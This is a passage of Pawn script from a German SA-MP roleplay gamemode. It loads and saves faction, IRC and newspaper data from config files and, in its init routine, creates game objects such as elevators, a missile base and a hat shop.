	new File: file2 = fopen("boxer.ini", io_write);
	fwrite(file2, coordsstring);
	fclose(file2);
	return 1;
}

Function LoadFrakMats()
{
/*	new arrCoords[17][64];
	new strFromFile2[256];
	new File: file = fopen("FrakMats.ini", io_read);
	if (file)
	{
	    fread(file, strFromFile2);
	    split2(strFromFile2, arrCoords, ',');
	    LCNMats = strval(arrCoords[0]);
		YakMats = strval(arrCoords[1]);
		TriadMats = strval(arrCoords[2]);
		GroveMats = strval(arrCoords[3]);
		BallasMats = strval(arrCoords[4]);
		BikerMats = strval(arrCoords[5]);
		VagosMats = strval(arrCoords[6]);
		AztecaMats = strval(arrCoords[7]);
		RSMats = strval(arrCoords[8]);
		TerrorMats = strval(arrCoords[9]);
		BrigadaMats = strval(arrCoords[10]);
		HitmanMats = strval(arrCoords[11]);
		SFRifaMats = strval(arrCoords[12]);
		WHMats = strval(arrCoords[13]);
		LSPDMats = strval(arrCoords[14]);
		FBIMats = strval(arrCoords[15]);
		LVPDMats = strval(arrCoords[16]);
		fclose(file);
	}
	else
	{
	    printf("FRAKMATS.INI FEHLT");
	}*/

	LCNMats = 1000000;
	YakMats = 1000000;
	TriadMats = 1000000;
	GroveMats = 1000000;
	BallasMats = 1000000;
	BikerMats = 1000000;
	VagosMats = 1000000;
	AztecaMats = 1000000;
	RSMats = 1000000;
	TerrorMats = 1000000;
	BrigadaMats = 1000000;
	HitmanMats = 1000000;
	SFRifaMats = 1000000;
	WHMats = 1000000;
	LSPDMats = 1000000;
	FBIMats = 1000000;
	LVPDMats = 1000000;

	return 1;
}
Function SaveFrakMats()
{
	new coordsstring[256];
	format(coordsstring, sizeof(coordsstring), "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d", LCNMats, YakMats, TriadMats, GroveMats, BallasMats, BikerMats, VagosMats, AztecaMats, RSMats, TerrorDrugs, BrigadaMats, HitmanMats, SFRifaMats, WHMats, LSPDMats, FBIMats, LVPDMats);
	new File: file2 = fopen("FrakMats.ini", io_write);
	fwrite(file2, coordsstring);
	fclose(file2);
	return 1;
}

Function SaveFrakDrugs()
{
	new coordsstring[256];
	format(coordsstring, sizeof(coordsstring), "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d", LCNDrugs, YakDrugs, TriadDrugs, GroveDrugs, BallasDrugs, BikerDrugs, VagosDrugs, AztecaDrugs, RSDrugs, TerrorDrugs, BrigadaDrugs, HitmanDrugs, SFRifaDrugs, WHDrugs);
	new File: file2 = fopen("FrakDrugs.ini", io_write);
	fwrite(file2, coordsstring);
	fclose(file2);
	return 1;
}
Function LoadFrakDrugs()
{
	new arrCoords[14][64];
	new strFromFile2[256];
	new File: file = fopen("FrakDrugs.ini", io_read);
	if (file)
	{
	    fread(file, strFromFile2);
	    split2(strFromFile2, arrCoords, ',');
	    LCNDrugs = strval(arrCoords[0]);
		YakDrugs = strval(arrCoords[1]);
		TriadDrugs = strval(arrCoords[2]);
		GroveDrugs = strval(arrCoords[3]);
		BallasDrugs = strval(arrCoords[4]);
		BikerDrugs = strval(arrCoords[5]);
		VagosDrugs = strval(arrCoords[6]);
		AztecaDrugs = strval(arrCoords[7]);
		RSDrugs = strval(arrCoords[8]);
		TerrorDrugs = strval(arrCoords[9]);
		BrigadaDrugs = strval(arrCoords[10]);
		HitmanDrugs = strval(arrCoords[11]);
		SFRifaDrugs = strval(arrCoords[12]);
		WHDrugs = strval(arrCoords[13]);
		fclose(file);
	}
	else
	{
	   	printf("FRAKDRUGS.INI FEHLT");
	}
	return 1;
}
Function LoadStuff()
{
	new arrCoords[7][64];
	new strFromFile2[256];
	new File: file = fopen("stuff.ini", io_read);
	if (file)
	{
		fread(file, strFromFile2);
		split2(strFromFile2, arrCoords, ',');
		Jackpot = strval(arrCoords[0]);
		Tax = strval(arrCoords[1]);
		TaxValue = strval(arrCoords[2]);
		Security = strval(arrCoords[3]);
		PayDayTeiler = strval(arrCoords[4]);
		LSAWaren = strval(arrCoords[5]);
		FarmerDrogen = strval(arrCoords[6]);
		fclose(file);
		if(Security == 0)
		{
		}
		else
		{
		    GameModeExit();
		}
	}
	else
	{
	    GameModeExit();
	}
	return 1;
}

Function SaveStuff()
{
	new coordsstring[256];
	format(coordsstring, sizeof(coordsstring), "%d,%d,%d,%d,%d,%d,%d", Jackpot,Tax,TaxValue,Security,PayDayTeiler,LSAWaren,FarmerDrogen);
	new File: file2 = fopen("stuff.ini", io_write);
	fwrite(file2, coordsstring);
	fclose(file2);
	return 1;
}

Function LoadIRC()
{
	new arrCoords[5][64];
	new strFromFile2[256];
	new File: file = fopen("channels.cfg", io_read);
	if (file)
	{
		new idx;
		while (idx < sizeof(IRCInfo))
		{
			fread(file, strFromFile2);
			split2(strFromFile2, arrCoords, '|');
			strmid(IRCInfo[idx][iAdmin], arrCoords[0], 0, strlen(arrCoords[0]), 255);
			strmid(IRCInfo[idx][iMOTD], arrCoords[1], 0, strlen(arrCoords[1]), 255);
			strmid(IRCInfo[idx][iPassword], arrCoords[2], 0, strlen(arrCoords[2]), 255);
			IRCInfo[idx][iNeedPass] = strval(arrCoords[3]);
			IRCInfo[idx][iLock] = strval(arrCoords[4]);
			//printf("IRC:%d Admin:%s MOTD: %s Password: %s NeedPass: %d Lock: %d",idx,IRCInfo[idx][iAdmin],IRCInfo[idx][iMOTD],IRCInfo[idx][iPassword],IRCInfo[idx][iNeedPass],IRCInfo[idx][iLock]);
			idx++;//LOGSPAMM
		}
		fclose(file);
	}
	return 1;
}

Function SaveIRC()
{
	new idx;
	new File: file2;
	while (idx < sizeof(IRCInfo))
	{
		new coordsstring[256];
		format(coordsstring, sizeof(coordsstring), "%s|%s|%s|%d|%d\n",
		IRCInfo[idx][iAdmin],
		IRCInfo[idx][iMOTD],
		IRCInfo[idx][iPassword],
		IRCInfo[idx][iNeedPass],
		IRCInfo[idx][iLock]);
		if(idx == 0)
		{
			file2 = fopen("channels.cfg", io_write);
		}
		else
		{
			file2 = fopen("channels.cfg", io_append);
		}
		fwrite(file2, coordsstring);
		idx++;
		fclose(file2);
	}
	return 1;
}




Function LoadPapers()
{
	new arrCoords[11][64];
	new strFromFile2[256];
	new File: file = fopen("papers.cfg", io_read);
	if (file)
	{
		new idx;
		while (idx < sizeof(PaperInfo))
		{
			fread(file, strFromFile2);
			split2(strFromFile2, arrCoords, '|');
			PaperInfo[idx][PaperUsed] = strval(arrCoords[0]);
			strmid(PaperInfo[idx][PaperMaker], arrCoords[1], 0, strlen(arrCoords[1]), 255);
			strmid(PaperInfo[idx][PaperTitle], arrCoords[2], 0, strlen(arrCoords[2]), 255);
			strmid(PaperInfo[idx][PaperText1], arrCoords[3], 0, strlen(arrCoords[3]), 255);
			strmid(PaperInfo[idx][PaperText2], arrCoords[4], 0, strlen(arrCoords[4]), 255);
			strmid(PaperInfo[idx][PaperText3], arrCoords[5], 0, strlen(arrCoords[5]), 255);
			strmid(PaperInfo[idx][PaperText4], arrCoords[6], 0, strlen(arrCoords[6]), 255);
			strmid(PaperInfo[idx][PaperText5], arrCoords[7], 0, strlen(arrCoords[7]), 255);
			strmid(PaperInfo[idx][PaperText6], arrCoords[8], 0, strlen(arrCoords[8]), 255);
			strmid(PaperInfo[idx][PaperText7], arrCoords[9], 0, strlen(arrCoords[9]), 255);
			PaperInfo[idx][SafeSaving] = strval(arrCoords[10]);
			//printf("Paper:%d Used: %d Maker:%s Title: %s Text1: %s Text2: %s Text3: %s Text4: %s Text5: %s Text6: %s Text7: %s",
			//LOGSPAMM
			//idx,PaperInfo[idx][PaperUsed],PaperInfo[idx][PaperMaker],PaperInfo[idx][PaperTitle],PaperInfo[idx][PaperText1],PaperInfo[idx][PaperText2],PaperInfo[idx][PaperText3],PaperInfo[idx][PaperText4],PaperInfo[idx][PaperText5],PaperInfo[idx][PaperText6],PaperInfo[idx][PaperText7]);
			idx++;
		}
		fclose(file);
	}
	return 1;
}

Function SavePapers()
{
	new idx;
	new File: file2;
	while (idx < sizeof(IRCInfo))
	{
		new coordsstring[256];
		format(coordsstring, sizeof(coordsstring), "%d|%s|%s|%s|%s|%s|%s|%s|%s|%s|%d\n",
		PaperInfo[idx][PaperUsed],
		PaperInfo[idx][PaperMaker],
		PaperInfo[idx][PaperTitle],
		PaperInfo[idx][PaperText1],
		PaperInfo[idx][PaperText2],
		PaperInfo[idx][PaperText3],
		PaperInfo[idx][PaperText4],
		PaperInfo[idx][PaperText5],
		PaperInfo[idx][PaperText6],
		PaperInfo[idx][PaperText7],
		PaperInfo[idx][SafeSaving]);
		if(idx == 0)
		{
			file2 = fopen("papers.cfg", io_write);
		}
		else
		{
			file2 = fopen("papers.cfg", io_append);
		}
		fwrite(file2, coordsstring);
		idx++;
		fclose(file2);
	}
	return 1;
}

Function LoadFraktionsKassen()
{
	new File:Kasse = fopen("Fraktionskassen.cfg",io_read);
	new idx = 0;
	new read[128];
	while(idx < sizeof(FraktionsKasse))
	{
	    fread(Kasse,read);
	    for(new x=0; x<strlen(read); x++)
	    {
	        if(read[x]== '\n')
			{
				read[x] = '\0';
			}
		}
		FraktionsKasse[idx] = strval(read);
		idx++;
	}
	fclose(Kasse);
	return 1;
}

Function SaveFraktionsKassen()
{
    new File:Kasse = fopen("Fraktionskassen.cfg",io_write);
	new write[24];
	for(new idx; idx < sizeof(FraktionsKasse); idx++)
	{
		format(write,sizeof(write),"%d\n",FraktionsKasse[idx]);
		fwrite(Kasse,write);
	}
	fclose(Kasse);
	return 1;
}

Function ShowLotto()
{
LottoTimer = 180;
OOCOff(COLOR_WHITE, "[Lotto]: Die Lotto Losziehung wurde automatisch gestartet!(3 Minuten)");
}






Function AddToBizzTill(bizzid,amount)
{
    SBizzInfo[bizzid][sbTill] += amount;
	return 1;
}

//------------------------------------------------------------------------------------------------------


public OnGameModeInit()
{


    // Display information in the Server Console
	mysql_log(ALL);
//    MapAndreas_Init(MAP_ANDREAS_MODE_FULL, "scriptfiles/SAFull.hmap");
	print("\n");
	print("  |---------------------------------------------------");
	print("  |--- LS BeachSide Filterscript");
    print("  |--  Script v1.03");
    print("  |--  19th April 2015");
	print("  |---------------------------------------------------");
    ConnectNPC("NPCGeld","yonpc");
    // Reset the elevator queue
	BResetBElevatorQueue();

	// Create the elevator object, the elevator doors and the floor doors
	BElevator_Initialize();

	// Display information in the Server Console
    print("  |--  LS BeachSide Building Elevator created");
    print("  |---------------------------------------------------");

    // Loop
    for (new i = 0; i < MAX_PLAYERS; i++)
    {
        // Check if the player is connected and not a NPC
        if (IsPlayerConnected(i) && !IsPlayerNPC(i))
        {
            // Remove the lamp post at the underground car park entrance
            RemoveBuildingForPlayer(i, 1226, 265.481, -1581.1, 32.9311, 5.0);

            // Remove the night lights object (must be removed to also remove any
		    // occulsion zones inside the building)
		    RemoveBuildingForPlayer(i, 6518, 280.297, -1606.2, 72.3984, 250.0);
        }
    }


	// irg azuoid auf -1
	for(new i=0; i<sizeof(OrgAuto); i++)
	{
	   OrgAuto[i][orgautodbid]= -1;
	}
	for(new i=0; i<sizeof(FactionCars); i++)
	{
	   FactionCars[i][factioncardbid]= -1;
	}
	for(new i = 0; i < sizeof(GfSystem); i++)
	{
	    GfSystem[i][ZoneID] = -1;
		GfSystem[i][Belongs2] = -1;
		GfSystem[i][AttackerFaction] = -1;
		GfSystem[i][FlaggenPickup] = -1;
		GfSystem[i][EinnahmeLabel] =  Text3D:-1;
	}

	TextDraw_EventZeit[0] = TextDrawCreate(589.999633, 357.170349, ":"); // eventimer
TextDrawLetterSize(TextDraw_EventZeit[0], 0.438000, 2.943997);
TextDrawTextSize(TextDraw_EventZeit[0], -1400.000000, 0.000000);
TextDrawAlignment(TextDraw_EventZeit[0], 1);
TextDrawColor(TextDraw_EventZeit[0], -1);
TextDrawSetShadow(TextDraw_EventZeit[0], 2);
TextDrawBackgroundColor(TextDraw_EventZeit[0], 255);
TextDrawFont(TextDraw_EventZeit[0], 3);
TextDrawSetProportional(TextDraw_EventZeit[0], 0);



/// Zum Test//Gf sys



/*
Textdraw5 = TextDrawCreate(0.000000, 81.303703, "LD_SPAC:white");  // white
TextDrawLetterSize(Textdraw5, 0.000000, 0.000000);
TextDrawTextSize(Textdraw5, 141.666671, 87.525932);
TextDrawAlignment(Textdraw5, 1);
TextDrawColor(Textdraw5, 0);
TextDrawSetShadow(Textdraw5, 0);
TextDrawSetOutline(Textdraw5, 0);
TextDrawFont(Textdraw5, 4);*/






Textdraw5 = TextDrawCreate(151.666656, 83.633331, "usebox"); // yo geht
TextDrawLetterSize(Textdraw5, 0.000000, 10.330246);
TextDrawTextSize(Textdraw5, -2.000000, 0.000000);
TextDrawAlignment(Textdraw5, 1);
TextDrawColor(Textdraw5, 0);
TextDrawUseBox(Textdraw5, true);
TextDrawBoxColor(Textdraw5, 102);
TextDrawSetShadow(Textdraw5, 0);
TextDrawSetOutline(Textdraw5, 0);
TextDrawFont(Textdraw5, 0);


Textdraw6 = TextDrawCreate(21.333322, 92.918525, "GANGFIGHT");
TextDrawLetterSize(Textdraw6, 0.449999, 1.600000);
TextDrawAlignment(Textdraw6, 1);
TextDrawColor(Textdraw6, -1);
TextDrawSetShadow(Textdraw6, 0);
TextDrawSetOutline(Textdraw6, 1);
TextDrawBackgroundColor(Textdraw6, 51);
TextDrawFont(Textdraw6, 1);
TextDrawSetProportional(Textdraw6, 1);

Textdraw7 = TextDrawCreate(4.333313, 109.925903, "Fraktion1:");
TextDrawLetterSize(Textdraw7, 0.384333, 1.342814);
TextDrawTextSize(Textdraw7, 225.999984, -12.444422);
TextDrawAlignment(Textdraw7, 1);
TextDrawColor(Textdraw7, -1);
TextDrawSetShadow(Textdraw7, 0);
TextDrawSetOutline(Textdraw7, 1);
TextDrawBackgroundColor(Textdraw7, 51);
TextDrawFont(Textdraw7, 1);
TextDrawSetProportional(Textdraw7, 1);

Textdraw8 = TextDrawCreate(3.666640, 131.081451, "Fraktion2:");
TextDrawLetterSize(Textdraw8, 0.379666, 1.301333);
TextDrawAlignment(Textdraw8, 1);
TextDrawColor(Textdraw8, -1);
TextDrawSetShadow(Textdraw8, 0);
TextDrawSetOutline(Textdraw8, 1);
TextDrawBackgroundColor(Textdraw8, 51);
TextDrawFont(Textdraw8, 1);
TextDrawSetProportional(Textdraw8, 1);

//

/*
TextDraw_EventZeit[1] = TextDrawCreate(617.999877, 357.585205, "00");
TextDrawLetterSize(TextDraw_EventZeit[1], 0.427333, 3.039407);
TextDrawTextSize(TextDraw_EventZeit[1], -489.000000, 0.000000);
TextDrawAlignment(TextDraw_EventZeit[1], 1);
TextDrawColor(TextDraw_EventZeit[1], -1);
TextDrawSetShadow(TextDraw_EventZeit[1], 2);
TextDrawBackgroundColor(TextDraw_EventZeit[1], 255);
TextDrawFont(TextDraw_EventZeit[1], 3);
TextDrawSetProportional(TextDraw_EventZeit[1], 0);

TextDraw_EventZeit[2] = TextDrawCreate(609.999755, 357.585083, ":");
TextDrawLetterSize(TextDraw_EventZeit[2], 0.495000, 2.624591);
TextDrawTextSize(TextDraw_EventZeit[2], -195.000000, 0.000000);
TextDrawAlignment(TextDraw_EventZeit[2], 1);
TextDrawColor(TextDraw_EventZeit[2], -1);
TextDrawSetShadow(TextDraw_EventZeit[2], 1);
TextDrawBackgroundColor(TextDraw_EventZeit[2], 255);
TextDrawFont(TextDraw_EventZeit[2], 1);
TextDrawSetProportional(TextDraw_EventZeit[2], 1);
TextDrawSetSelectable(TextDraw_EventZeit[2], true);*/


	//

	// Create the LS Apartments 1 Building object
    LSApartments1Object = CreateObject(19595, 1160.96, -1180.58, 70.4141, 0, 0, 0);

    // Display information in the Server Console
    print("  |--  LS Apartments 1 Building object created");

    // Create the LS Apartments 1 Car Park object
    LSApartments1CPObject = CreateObject(19798, 1160.96, -1180.58, 20.4141, 0, 0, 0);

    // Display information in the Server Console
    print("  |--  LS Apartments 1 Car Park object created");

    // Reset the elevator queue
	AResetAElevatorQueue();

	// Create the elevator object, the elevator doors and the floor doors
	AElevator_Initialize();

	// Display information in the Server Console
    print("  |--  LS Apartments 1 Elevator created");
    print("  |---------------------------------------------------");

    // Loop
    for (new i = 0; i < MAX_PLAYERS; i++)
    {
        // Check if the player is connected and not a NPC
        if (IsPlayerConnected(i) && !IsPlayerNPC(i))
        {
            // Remove default GTASA building map object, LOD and awning shadows
            // (so any player currently ingame does not have to rejoin for them
			//  to be removed when this filterscript is loaded)
			RemoveBuildingForPlayer(i, 5766, 1160.96, -1180.58, 70.4141, 250.0); // Awning shadows
			RemoveBuildingForPlayer(i, 5767, 1160.96, -1180.58, 70.4141, 250.0); // Building
			RemoveBuildingForPlayer(i, 5964, 1160.96, -1180.58, 70.4141, 250.0); // LOD
        }
    }





    SetTimer("AntiAdminabuse", 31000, 1);
// FBI Base



//


// NPC

npcveh = AddStaticVehicle(445,1535.7234,-1733.5660,13.3828,0.0,1,1);


//


// Raketen

	missileBase[0] = CreateObject(7191, 264.07342529297, 1881.6575927734, -6.2552056312561, 270.25024414063, 0, 0);
	missileBase[1] = CreateObject(7191, 264.08120727539, 1885.5596923828, -6.2552056312561, 270.24719238281, 0, 0);
	missileBase[2] = CreateObject(7191, 264.07913208008, 1886.9434814453, -6.2552056312561, 270.24719238281, 0, 0);
	missileBase[3] = CreateObject(7191, 265.77478027344, 1888.6229248047, -6.2552056312561, 270.2470703125, 0, 269.5);
	missileBase[4] = CreateObject(7191, 269.59817504883, 1888.6110839844, -6.2552056312561, 270.24169921875, 0, 269.49462890625);
	missileBase[5] = CreateObject(7191, 272.73175048828, 1888.5932617188, -6.2552056312561, 270.24169921875, 0, 269.49462890625);
	missileBase[6] = CreateObject(7191, 273.43814086914, 1886.9455566406, -6.2552056312561, 270.24145507813, 0, 179.99462890625);
	missileBase[7] = CreateObject(7191, 273.44381713867, 1883.1752929688, -6.2552056312561, 270.23620605469, 0, 179.99450683594);
	missileBase[8] = CreateObject(7191, 273.50357055664, 1879.896484375, -6.2552056312561, 270.23620605469, 0, 179.99450683594);
	missileBase[9] = CreateObject(7191, 271.66961669922, 1879.6162109375, -6.2552056312561, 270.23657226563, 0, 90.494506835938);
	missileBase[10] = CreateObject(7191, 268.20278930664, 1879.5903320313, -6.2552056312561, 270.23657226563, 0, 89.991943359375);
	missileBase[11] = CreateObject(7191, 265.30517578125, 1879.5936279297, -6.2552056312561, 270.23620605469, 0, 89.989013671875);
	missileBase[12] = CreateObject(3530, 273.34002685547, 1884.0528564453, -15.669961929321, 0, 0, 0);
	missileBase[13] = CreateObject(3530, 273.34033203125, 1884.0277099609, -6.1449637413025, 0, 0, 0);
	missileBase[14] = CreateObject(3530, 273.33984375, 1884.02734375, 3.3550362586975, 0, 0, 0);
	missileBase[15] = CreateObject(3530, 273.33984375, 1884.02734375, 13.130035400391, 0, 0, 0);
	missileBase[16] = CreateObject(3530, 273.33984375, 1884.02734375, 22.380035400391, 0, 0, 0);
	missileBase[17] = CreateObject(3530, 273.33984375, 1884.02734375, 32.130035400391, 0, 0, 0);
	missileBase[18] = CreateObject(2951, 268.15289306641, 1875.2196044922, 7.609375, 0, 0, 0.25);

	jetDoor = CreateObject(3095, 268.62051391602, 1884.1695556641, 16.040634155273, 0, 0, 0);
	lift = CreateObject(3115, 264.57867431641, 1888.5306396484, -20.273397445679, 0, 0, 0);

	CreateMissile();


//

// Hat Shop
	CreateObject(19461, 1838.39331, -1850.57227, 14.09229,   0.00000, 0.00000, -89.82000);
CreateObject(19461, 1841.63684, -1850.56921, 14.09229,   0.00000, 0.00000, -89.82000);
CreateObject(19461, 1843.25671, -1855.12793, 14.33000,   0.00000, 0.00000, 0.06000);
CreateObject(1569, 1834.03479, -1841.12512, 12.64400,   0.00000, 0.00000, -90.60000);
CreateObject(1569, 1834.01233, -1844.09692, 12.64400,   0.00000, 0.00000, 89.03990);
CreateObject(970, 1833.87878, -1850.38110, 13.05430,   0.00000, 0.00000, 0.00000);
CreateObject(970, 1833.86853, -1844.88489, 13.05430,   0.00000, 0.00000, 0.00000);
CreateObject(970, 1833.77124, -1840.60681, 13.05430,   0.00000, 0.00000, 0.00000);
CreateObject(970, 1833.75818, -1834.47559, 13.05430,   0.00000, 0.00000, 0.00000);
CreateObject(970, 1831.81079, -1848.35754, 13.05430,   0.00000, 0.00000, 90.41999);
CreateObject(970, 1831.69946, -1838.51990, 13.05430,   0.00000, 0.00000, 90.41999);
CreateObject(970, 1831.70483, -1836.51221, 13.05430,   0.00000, 0.00000, 90.41999);
CreateObject(970, 1831.82495, -1846.93030, 13.05430,   0.00000, 0.00000, 90.41999);
CreateObject(1280, 1831.53796, -1848.11304, 12.95550,   0.00000, 0.00000, 0.00000);
CreateObject(1280, 1831.41431, -1837.59314, 12.95550,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1833.14026, -1846.34399, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1833.17493, -1848.99438, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1832.51270, -1849.04883, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1832.56555, -1846.38354, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1832.18518, -1846.38586, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1832.20313, -1849.10620, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1833.22400, -1835.87207, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1833.23877, -1838.16956, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1833.25818, -1839.25500, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1832.73218, -1839.24243, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1832.74524, -1837.00134, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1832.72559, -1835.91589, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1832.12341, -1835.93359, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1832.18872, -1838.46594, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1832.18701, -1839.23169, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(1216, 1831.51660, -1845.12158, 13.26040,   0.00000, 0.00000, -90.66000);
CreateObject(1231, 1832.76160, -1844.81042, 14.06642,   0.00000, 0.00000, 83.82003);
CreateObject(1231, 1833.04688, -1840.80005, 14.06642,   0.00000, 0.00000, 96.12001);
CreateObject(19456, 1833.73877, -1835.07422, 13.35923,   0.00000, 0.00000, 0.00000);
CreateObject(19437, 1833.02686, -1830.25781, 13.35920,   0.00000, 0.00000, 90.54002);
CreateObject(19442, 1844.22656, -1853.89063, 17.96320,   0.00000, 0.00000, 0.00000);
CreateObject(19442, 1844.24280, -1855.47168, 17.96320,   0.00000, 0.00000, 0.00000);
CreateObject(19442, 1844.24011, -1857.07385, 17.96320,   0.00000, 0.00000, 0.00000);
CreateObject(19442, 1844.24670, -1858.05481, 17.96320,   0.00000, 0.00000, 0.00000);
CreateObject(19461, 1845.85010, -1851.33093, 14.35000,   0.00000, 0.00000, -90.00000);
CreateObject(19461, 1836.23706, -1851.33093, 14.35000,   0.00000, 0.00000, -90.00000);
CreateObject(19415, 1831.47852, -1852.79395, 14.33000,   0.00000, 0.00000, 0.00000);
CreateObject(19415, 1831.47852, -1858.41992, 14.33000,   0.00000, 0.00000, 0.00000);
CreateObject(19397, 1831.47852, -1855.67163, 14.33000,   0.00000, 0.00000, 0.00000);
CreateObject(19466, 1831.43030, -1852.76160, 14.24408,   0.00000, 0.00000, 0.00000);
CreateObject(19466, 1831.41882, -1858.38477, 14.24408,   0.00000, 0.00000, 0.00000);
CreateObject(19461, 1843.64368, -1855.11743, 15.90000,   0.00000, -90.00000, 0.00000);
CreateObject(19461, 1840.11719, -1855.11743, 15.90000,   0.00000, -90.00000, 0.00000);
CreateObject(19461, 1836.71814, -1855.11743, 15.90000,   0.00000, -90.00000, 0.00000);
CreateObject(19461, 1833.20752, -1855.11743, 15.90000,   0.00000, -90.00000, 0.00000);
CreateObject(19415, 1834.73059, -1859.91882, 14.33000,   0.00000, 0.00000, 90.00000);
CreateObject(19466, 1839.69434, -1859.92676, 14.24408,   0.00000, 0.00000, 89.27998);
CreateObject(19415, 1839.49915, -1859.91882, 14.33000,   0.00000, 0.00000, 90.00000);
CreateObject(19466, 1834.67151, -1859.96838, 14.24408,   0.00000, 0.00000, 90.11997);
CreateObject(19442, 1832.32019, -1859.91882, 14.33000,   0.00000, 0.00000, 90.00000);
CreateObject(19442, 1837.10962, -1859.91882, 14.33000,   0.00000, 0.00000, 90.00000);
CreateObject(1569, 1831.50903, -1856.35547, 12.50000,   0.00000, 0.00000, 216.35989);
CreateObject(2714, 1831.30164, -1855.48120, 15.50000,   0.00000, 0.00000, -88.74000);
CreateObject(19442, 1832.25061, -1850.33813, 14.33000,   0.00000, 0.00000, -90.00000);
CreateObject(19461, 1844.63965, -1860.03357, 10.33000,   0.00000, 0.00000, -89.82000);
CreateObject(638, 1830.93481, -1851.61450, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(970, 1830.40723, -1852.30200, 13.05430,   0.00000, 0.00000, 90.41999);
CreateObject(970, 1832.36523, -1850.25830, 13.05430,   0.00000, 0.00000, 0.00000);
CreateObject(638, 1830.90527, -1853.19531, 13.16425,   0.00000, 0.00000, 0.00000);
CreateObject(19379, 1847.05322, -1855.15430, 12.51550,   0.00000, 90.00000, 0.00000);
CreateObject(2372, 1834.28455, -1853.18628, 12.56780,   0.00000, 0.00000, 0.00000);
CreateObject(2394, 1834.07520, -1852.65002, 13.29370,   0.00000, 0.00000, -89.82000);
CreateObject(2372, 1835.42590, -1853.08105, 12.56780,   0.00000, 0.00000, 0.00000);
CreateObject(2394, 1835.19617, -1852.54480, 13.29370,   0.00000, 0.00000, -89.82000);
CreateObject(2390, 1833.36804, -1851.71814, 13.55135,   0.00000, 0.00000, 0.00000);
CreateObject(2385, 1839.02490, -1851.47290, 12.60000,   0.00000, 0.00000, 0.00000);
CreateObject(2385, 1839.02490, -1851.47290, 13.90000,   0.00000, 0.00000, 0.00000);
CreateObject(2385, 1841.18665, -1851.46033, 12.60000,   0.00000, 0.00000, 0.00000);
CreateObject(2385, 1841.23291, -1851.42517, 13.90000,   0.00000, 0.00000, 0.00000);
CreateObject(2371, 1837.08899, -1859.43555, 12.54980,   0.00000, 0.00000, 0.00000);
CreateObject(2394, 1836.75537, -1858.80750, 13.27570,   0.00000, 1.50000, -89.82000);
CreateObject(2381, 1837.47461, -1858.71741, 13.30000,   0.00000, 0.00000, 89.76000);
CreateObject(2371, 1834.38403, -1859.43079, 12.54980,   0.00000, 0.00000, 0.00000);
CreateObject(2394, 1834.81213, -1858.73340, 13.27570,   0.00000, 1.50000, -89.82000);
CreateObject(2394, 1834.13721, -1858.78479, 13.27570,   0.00000, 1.50000, -89.82000);
CreateObject(2387, 1832.14624, -1852.42627, 12.60000,   0.00000, 0.00000, 0.00000);
CreateObject(2387, 1832.14624, -1853.63220, 12.60000,   0.00000, 0.00000, 0.00000);
CreateObject(2387, 1832.14624, -1859.02148, 12.60000,   0.00000, 0.00000, 0.00000);
CreateObject(2387, 1832.14624, -1857.78394, 12.60000,   0.00000, 0.00000, 0.00000);
CreateObject(2846, 1836.35815, -1858.88647, 12.62007,   0.00000, 0.00000, 0.00000);
CreateObject(2846, 1833.89697, -1858.87585, 12.62007,   0.00000, 0.00000, 0.00000);
CreateObject(2390, 1833.36804, -1851.71814, 14.55130,   0.00000, 0.00000, 0.00000);
CreateObject(2390, 1834.29456, -1851.61462, 14.55130,   0.00000, 0.00000, 0.00000);
CreateObject(2390, 1834.27380, -1851.76526, 13.55130,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1838.92871, -1851.78674, 13.52515,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1839.57605, -1851.80811, 13.52515,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1840.27502, -1851.84424, 13.52515,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1841.01965, -1851.76282, 13.52515,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1841.71973, -1851.77881, 13.52515,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1842.53955, -1851.80054, 13.52515,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1842.53955, -1851.80054, 14.40000,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1842.53955, -1851.80054, 13.52515,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1841.71973, -1851.77881, 14.40000,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1841.01965, -1851.76282, 14.40000,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1840.27502, -1851.84424, 14.40000,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1839.57605, -1851.80811, 14.40000,   0.00000, 0.00000, 0.00000);
CreateObject(19624, 1838.92871, -1851.78674, 14.40000,   0.00000, 0.00000, 0.00000);
CreateObject(2374, 1836.01819, -1851.67310, 13.49160,   0.00000, 0.00000, 0.00000);
CreateObject(2374, 1836.01819, -1851.67310, 14.49160,   0.00000, 0.00000, 0.00000);
CreateObject(2390, 1837.31787, -1851.66138, 14.55130,   0.00000, 0.00000, 0.00000);
CreateObject(2374, 1837.29346, -1851.62891, 13.49160,   0.00000, 0.00000, 0.00000);
CreateObject(2390, 1836.66687, -1851.66553, 14.55130,   0.00000, 0.00000, 0.00000);
CreateObject(2374, 1836.66577, -1851.64917, 13.49160,   0.00000, 0.00000, 0.00000);
CreateObject(2387, 1842.28113, -1859.49426, 12.60000,   0.00000, 0.00000, 0.00000);
